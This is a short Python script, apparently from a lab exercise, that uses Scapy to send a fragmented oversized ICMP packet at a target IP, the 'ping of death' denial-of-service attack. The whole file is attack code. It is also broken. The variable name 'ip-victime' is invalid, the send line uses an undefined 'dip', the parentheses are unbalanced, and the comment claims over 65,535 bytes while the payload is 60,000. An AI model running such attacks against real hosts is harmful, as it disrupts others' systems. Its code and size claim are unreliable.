#!/usr/bin/python

# Change log level to suppress annoying IPv6 error
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

#Import Scapi library
from scapy.all import *

ip-victime = raw_input('Please enter the IP address of the target (virtual machine) : ')

#Then, we send a fragmented packet of over 65,535 bytes :
send(fragment(IP(dst=dip)/ICMP()/('X'*60000))